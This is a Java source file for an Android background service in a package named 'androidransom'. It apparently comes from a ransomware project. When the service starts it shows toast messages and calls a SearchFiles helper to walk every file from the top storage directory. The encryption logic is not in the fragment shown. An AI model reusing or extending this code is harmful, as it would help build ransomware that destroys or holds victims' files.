package bycracks.androidransom;

import android.app.IntentService;
import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.widget.Toast;

import java.io.File;


public class MyService extends Service {
    Handler mHandler;

    @Override
    public void onCreate() {
        super.onCreate();
        Toast.makeText(this, "start service", Toast.LENGTH_SHORT).show();
    }

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Toast.makeText(this, "onStartCommand Start", Toast.LENGTH_SHORT).show();

        SearchFiles searching = new SearchFiles();
        File f = searching.getTopDir();
        searching.searchAllFile(f);

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Toast.makeText(this, "Service end", Toast.LENGTH_SHORT).show();
    }

}
